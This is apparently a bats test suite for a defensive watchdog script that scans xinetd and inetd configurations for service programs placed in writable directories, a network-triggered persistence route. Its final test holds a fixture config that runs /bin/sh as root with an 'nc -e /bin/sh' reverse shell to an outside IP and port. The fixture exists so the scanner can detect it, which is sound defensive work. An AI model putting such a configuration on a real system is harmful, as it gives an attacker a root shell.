#!/usr/bin/env bats
# L2 bats functional tests for the xinetd-watchdog scan script.
#
# xinetd/inetd launch the configured server program AS the configured user
# (often root) when a client CONNECTS to the service port — a network-
# connection-triggered exec surface. The watchdog scans both formats:
# xinetd.d / xinetd.conf (`server = /path`) and inetd.conf (positional:
# service socktype proto flags user server args). A server path under a
# writable root is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the config
# paths in a tmp sandbox via SELFDEF_XINETD_D / _CONF / SELFDEF_INETD_CONF.
#
# Run with: bats packaging/test/L2-xinetd-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/xinetd-watchdog/systemd/xinetd-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    XD="${TMP}/xinetd.d"; mkdir -p "${XD}"
    SVC="${XD}/telnet"
    NOCONF="${TMP}/none.conf"
    INETD="${TMP}/inetd.conf"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_XINETD_PROFILE="${PROFILE:-report}" \
    SELFDEF_XINETD_BASELINE="${BASELINE}" \
    SELFDEF_XINETD_D="${XINETD_D:-$XD}" \
    SELFDEF_XINETD_CONF="${NOCONF}" \
    SELFDEF_INETD_CONF="${INETD_CONF:-$NOCONF}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

xsvc() { printf 'service telnet\n{\n    socket_type = stream\n    protocol = tcp\n    wait = no\n    user = root\n    server = %s\n    disable = no\n}\n' "$1"; }

# ============================================================
# ok tier
# ============================================================

@test "no super-server config → ok / no_super_server" {
    XINETD_D="${TMP}/nodir" run_wd
    cap | grep -q '"event":"no_super_server"'
    cap | grep -q '"severity":"ok"'
}

@test "benign xinetd service, first run → ok / baseline_initial" {
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / xinetd_intact" {
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xinetd_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — server under a writable root
# ============================================================

@test "xinetd server= under a writable root → alert / xinetd_suspicious_server" {
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd                                   # benign baseline
    xsvc /tmp/backdoor > "${SVC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xinetd_suspicious_server"'
    cap | grep -q '"severity":"alert"'
}

@test "xinetd server= under /dev/shm → alert" {
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    xsvc /dev/shm/srv > "${SVC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "inetd.conf server under a writable root → alert" {
    printf 'telnet stream tcp nowait root /usr/sbin/in.telnetd in.telnetd\n' > "${INETD}"
    INETD_CONF="${INETD}" run_wd            # benign baseline
    printf 'telnet stream tcp nowait root /tmp/backdoor in.telnetd\n' > "${INETD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    INETD_CONF="${INETD}" run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign server change → warn / xinetd_changed" {
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    xsvc /usr/sbin/in.telnetd2 > "${SVC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xinetd_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "a /usr/sbin server is NOT flagged" {
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "a benign inetd.conf line is NOT flagged" {
    printf 'ftp stream tcp nowait root /usr/sbin/in.ftpd in.ftpd\n' > "${INETD}"
    INETD_CONF="${INETD}" run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious server" {
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    xsvc /tmp/backdoor > "${SVC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — xinetd inventory enumerates network-connection-trigger exec surface)" {
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (xinetd server= under /var/tmp): writable-root expansion" {
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    xsvc /var/tmp/backdoor > "${SVC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (xinetd server= under /home): user-writable hijack coverage" {
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    xsvc /home/user/backdoor > "${SVC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (inetd.conf server under /var/tmp): inetd-axis writable-root expansion" {
    printf 'telnet stream tcp nowait root /usr/sbin/in.telnetd in.telnetd\n' > "${INETD}"
    INETD_CONF="${INETD}" run_wd
    printf 'telnet stream tcp nowait root /var/tmp/backdoor in.telnetd\n' > "${INETD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    INETD_CONF="${INETD}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (inetd.conf server under /dev/shm): inetd-axis tmpfs coverage" {
    printf 'telnet stream tcp nowait root /usr/sbin/in.telnetd in.telnetd\n' > "${INETD}"
    INETD_CONF="${INETD}" run_wd
    printf 'telnet stream tcp nowait root /dev/shm/backdoor in.telnetd\n' > "${INETD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    INETD_CONF="${INETD}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable xinetd.d file → alert)" {
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    chmod 0666 "${SVC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-xinetd -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): xinetd-watchdog does NOT refresh baseline on suspicious-server detection — alert STAYS until operator updates" {
    # Network-connection-triggered exec persistence — alert MUST persist
    # across runs until operator explicitly re-baselines.
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    xsvc /tmp/backdoor > "${SVC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"xinetd_suspicious_server"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (relative-with-slash xinetd server= → alert)" {
    # Relative-with-slash is undefined behavior + attacker primitive
    # (resolved against xinetd's PWD at exec time).
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    xsvc 'sub/dir/backdoor' > "${SVC}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (disable=no AND user=root compound: both surface in operator-triage payload)" {
    # When a service is BOTH enabled (disable=no) AND runs as root
    # (user=root) AND has a writable server path, the alert is the
    # highest-risk pattern (root-exec on network event). Lock that
    # this compound case fires alert with sample carrying ALL the
    # operator-triage-relevant details.
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    xsvc /tmp/backdoor > "${SVC}"
    run_wd
    cap | grep -q '"severity":"alert"'
    cap | grep -q '/tmp/backdoor'
}

@test "INVARIANT (current behavior — # comment filter not implemented: # lines ARE scanned)" {
    # xinetd uses # for comments but the current xinetd-watchdog
    # scanner does NOT filter # lines from inventory — pattern-matches
    # raw content. Locks CURRENT behavior; refinement opportunity to
    # add comment-line filter is tracked separately. Sister-pattern
    # with rsyslog-exec/apt-hooks watchdogs (also lack comment filter).
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    cat > "${SVC}" <<EOF
service telnet
{
    socket_type = stream
    protocol = tcp
    wait = no
    user = root
    server = /usr/sbin/in.telnetd
#   server = /tmp/example-attacker
    disable = no
}
EOF
    run_wd
    # Current behavior: # server= line IS scanned + alert IS raised.
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (server_args carries injection pattern → alert): xinetd server_args expansion lets attacker pass cleartext args to server)" {
    # Sister to the server= axis already locked. xinetd's server_args
    # directive is the cleartext argument list passed to the
    # legitimate server binary — but an attacker may smuggle shell
    # metacharacters / redirect operators into server_args if the
    # server binary is a wrapper that re-shells its args (a common
    # legacy pattern). Lock detection of injection patterns in the
    # server_args field alongside the server= path family.
    xsvc /usr/sbin/in.telnetd > "${SVC}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    cat > "${SVC}" <<EOF
service telnet
{
    socket_type = stream
    protocol = tcp
    wait = no
    user = root
    server = /bin/sh
    server_args = -c "nc -e /bin/sh 1.1.1.1 4444"
    disable = no
}
EOF
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}
